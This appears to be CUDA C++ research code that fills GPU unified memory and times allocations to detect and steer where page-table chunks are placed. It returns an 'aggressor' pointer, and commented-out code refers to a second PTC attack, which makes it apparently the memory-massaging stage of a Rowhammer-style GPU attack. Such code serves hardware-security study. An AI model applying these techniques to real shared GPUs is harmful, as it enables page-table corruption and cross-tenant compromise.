#include <iostream>
#include <cuda.h>
#include <chrono>
#include <thread>
#include "./sc_firstPTC.cuh"
#include "./sc_allocallmem.cuh"

const size_t ALLOC_SIZE = 2 * 1024 * 1024;

uint64_t first_PT_chunk_evcit(int argc, char *argv[])
{
    const uint64_t num_alloc = std::stoll(argv[0]);
    const double threshold = std::stod(argv[1]);
    const uint64_t skip = std::stoull(argv[2]);

    char **alloc_ptrs = nullptr;

    if (!alloc_all_mem(num_alloc, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }

    char *temp;
    size_t free_byte;
    size_t total_byte;
    auto cuda_status = cudaMemGetInfo(&free_byte, &total_byte);

    if ( cudaSuccess != cuda_status )
    {
        printf("Error: cudaMemGetInfo fails, %s \n", cudaGetErrorString(cuda_status));
        exit(1);
    }

    double maxTimeMS = 0;
    uint64_t max_alloc_chunks = total_byte / ALLOC_SIZE;
    for (uint64_t i = 0; i < max_alloc_chunks; i += 1)
    {
        for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(alloc_ptrs[i] + j) = 'a';

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);

        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        // std::cout << i + 1 << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;

        if (maxTimeMS == 0)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS && currentMS < threshold)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS)
        {
            std::cout <<  "After \033[1;31m" << i + 1 << "\033[0m 2MB Allocations:" << std::endl;
            std::cout << "Normal Latency: " << maxTimeMS << ", Mem Full Latency: " << duration_evict.count() << " ms"<< std::endl;
            return i + 1;
        }
    }
    return 0;
}

bool first_PT_chunk(int argc, char *argv[])
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const double threshold = std::stod(argv[2]);
    const uint64_t skip = std::stoull(argv[3]);

    return first_PT_chunk(num_alloc_init, num_alloc, threshold, skip);
}

bool first_PT_chunk(uint64_t num_alloc_init, uint64_t num_alloc, double threshold, uint64_t skip)
{
    char **alloc_ptrs = nullptr;

    if (!alloc_all_mem(num_alloc_init, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }

    char *temp;
    double maxTimeMS = 0;
    for (uint64_t i = 0; i < num_alloc; i += 1)
    {
        for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(alloc_ptrs[i] + j) = 'a';
        if (i == num_alloc - 1)
            for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
                *(alloc_ptrs[i + 1] + j) = 'a';

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);

        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i + 1 << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;

        if (maxTimeMS == 0)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS && currentMS < threshold)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS)
        {
            std::cout <<  "\033[1;31m" << "Error!" << "\033[0m" << std::endl;
            std::cout <<  "After \033[1;31m" << i + 1 << "\033[0m 2MB Allocations:" << std::endl;
            std::cout << "Normal Latency: " << maxTimeMS << ", Mem Full Latency: " << duration_evict.count() << " ms"<< std::endl;
            return false;
        }
    }
    return true;
}

bool first_PT_chunk_fill(int argc, char *argv[], char ***first_ptc_ptrs, char **agg_ptr)
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const uint64_t alloc_id = std::stoll(argv[2]);
    const double threshold = std::stod(argv[3]);
    const uint64_t skip = std::stoull(argv[4]);

    return first_PT_chunk_fill(num_alloc_init, num_alloc, alloc_id, threshold, skip, first_ptc_ptrs, agg_ptr);
}

/* I should return the newly allocated memory, the aggressor pointer. */
bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t alloc_id, double threshold, uint64_t skip , char ***first_ptc_ptrs, char **agg_ptr)
{
    char **alloc_ptrs = nullptr;
    char **before_chunk_ptrs = (char **)malloc(num_alloc * sizeof(char*));

    if (!alloc_all_mem(num_alloc_init, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }
    std::cout << "Memory Allocated to Full" << '\n';

    char *temp;
    double maxTimeMS = 0;
    int timein;
    std::cin >> timein;

    /**
     * Rational:
     *  Given PTC is pushed down as you allocate more memory, 
     *  we want to to control where it goes we need to:
     *      1. We can allocate memory sequentially until we are 4MB 
     *          away from the desired position.
     *      2. We start allocating from the end, avoiding to take over that space
     *      3. Before the we made num_alloc allocations, we free up the next 4MB
     *          from step 1.
     *      4. The PTC allocation is then triggered on that piece of memory.
     */
    for (uint64_t i = 0; i < num_alloc; i += 1)
    {
        if (i < alloc_id - 1)
            for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
                *(alloc_ptrs[i] + j) = 'a';
        else if (i == num_alloc - 1)
            for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            {
                *(alloc_ptrs[alloc_id - 1] + j) = 'a';
                *(alloc_ptrs[alloc_id] + j) = 'a';
            }
        else
            for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
                *(alloc_ptrs[i + 2] + j) = 'a';

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);
        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();

        before_chunk_ptrs[i] = temp;
        // std::cout << i + 1 << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;

        if (maxTimeMS == 0)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS && currentMS < threshold)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS)
        {
            std::cout <<  "\033[1;31m" << "Error!" << "\033[0m" << std::endl;
            std::cout <<  "After \033[1;31m" << i + 1 << "\033[0m 2MB Allocations:" << std::endl;
            std::cout << "Normal Latency: " << maxTimeMS << ", Mem Full Latency: " << duration_evict.count() << " ms"<< std::endl;
            return false;
        }
    }

    std::cout << "First PTC Generated " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    /* Free up CPU memory by releasing the evicted memories */
    for (uint64_t i = 0; i < num_alloc_init; i += 1)
        cudaFree(alloc_ptrs[i]);
    free(alloc_ptrs);

    for (uint64_t i = 0; i < num_alloc - 1; i += 1)
        cudaFree(before_chunk_ptrs[i]);

    std::cout << "Prior Mem Freed " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    std::cout << std::hex << (void*)before_chunk_ptrs[num_alloc-1]<< '\n';

    if (agg_ptr)
        *agg_ptr = before_chunk_ptrs[num_alloc-1];
    free(before_chunk_ptrs);

    maxTimeMS = 0;
    std::cout << std::dec;
    if (first_ptc_ptrs)
        *first_ptc_ptrs = (char **)malloc((num_alloc_init - 2) * sizeof(char*));
    for (uint64_t i = 0; i < num_alloc_init - 2; i += 1)
    {
        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);
        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i + 1 << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        if (first_ptc_ptrs)
            (*first_ptc_ptrs)[i] = temp;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;

        if (maxTimeMS == 0)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS && currentMS < 0.32)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS)
        {
            std::cout <<  "\033[1;31m" << "Error!" << "\033[0m" << std::endl;
            std::cout <<  "After \033[1;31m" << i + 1 << "\033[0m 2MB Allocations:" << std::endl;
            std::cout << "Normal Latency: " << maxTimeMS << ", Mem Full Latency: " << duration_evict.count() << " ms"<< std::endl;

            return false;
        }
    }

    // for (uint64_t i = 0; i < num_alloc_init - 2; i += 1)
    // {
    //     memset_ptr<<<1, 1>>>(ptrs[i] + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
    // }

    // memset_ptr<<<1, 1>>>(firstPT_ptrs[num_alloc-1] + 64 * 1024, 2 * 1024 * 1024 - 64 * 1024);
    // cudaDeviceSynchronize();

    // std::cout << (void*)firstPT_ptrs[num_alloc-1] << '\n';
    // std::cout << "First PTC Filled " << '\n';
    // std::cin.clear();
    // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    // std::cin >> timein;

    // print_memory<<<1, 1>>>(firstPT_ptrs[num_alloc-1] + 64 * 1024, 100);
    // cudaDeviceSynchronize();

    // std::cout << (void*)ptrs[894] << '\n';
    // std::cout << (void*)ptrs[895] << '\n';
    // std::cout << "Content Printed " << '\n';
    // std::cin.clear();
    // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    // std::cin >> timein;

    // maxTimeMS = 0;
    // // 892
    // for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
    //     *(ptrs[0] + j) = 'a';
    // for (uint64_t i = 2; i < 895; i += 1)
    // {

    //     for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
    //         *(ptrs[i] + j) = 'a';
    //     if (i == 514)
    //         {
    //             for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
    //                  *(ptrs[1] + j) = 'a';
    //         }
    //     if (i == 894)
    //         {
    //             for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
    //                  *(ptrs[895] + j) = 'a';
    //         }

    //     // Create Free Space
    //     cudaMallocManaged(&temp, 2 * 1024 * 1024 + 4096);
    //     auto start = std::chrono::high_resolution_clock::now();
    //     initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024 + 4096);
    //     cudaDeviceSynchronize();
    //     auto end = std::chrono::high_resolution_clock::now();

    //     gpuErrchk(cudaPeekAtLastError());
    //     std::chrono::duration<double, std::milli> duration_evict = end - start;
    //     double currentMS = duration_evict.count();
    //     std::cout << i + 1 << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

    //     // Generate Page Table for 64KB Pages.
    //     *(temp + 0) = 'a';

    //     if (i < skip)
    //         continue;

    //     if (maxTimeMS == 0)
    //         maxTimeMS = currentMS;
    //     else if (currentMS > maxTimeMS && currentMS < 0.35)
    //         maxTimeMS = currentMS;
    //     else if (currentMS > maxTimeMS)
    //     {
    //         std::cout <<  "\033[1;31m" << "Error!" << "\033[0m" << std::endl;
    //         std::cout <<  "After \033[1;31m" << i + 1 << "\033[0m 2MB Allocations:" << std::endl;
    //         std::cout << "Normal Latency: " << maxTimeMS << ", Mem Full Latency: " << duration_evict.count() << " ms"<< std::endl;

    //         std::cout << "Second PTC Attack " << '\n';
    //         std::cin.clear();
    //         std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    //         std::cin >> timein;
    //         return false;
    //     }
    // }

    // std::cout << "Second attack PTC created " << '\n';
    // std::cin.clear();
    // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    // std::cin >> timein;

    // print_memory<<<1, 1>>>(firstPT_ptrs[num_alloc-1] + 64 * 1024, 100);
    // cudaDeviceSynchronize();

    // std::cout << "Content Printed " << '\n';
    // std::cin.clear();
    // std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    // std::cin >> timein;

    return true;
}
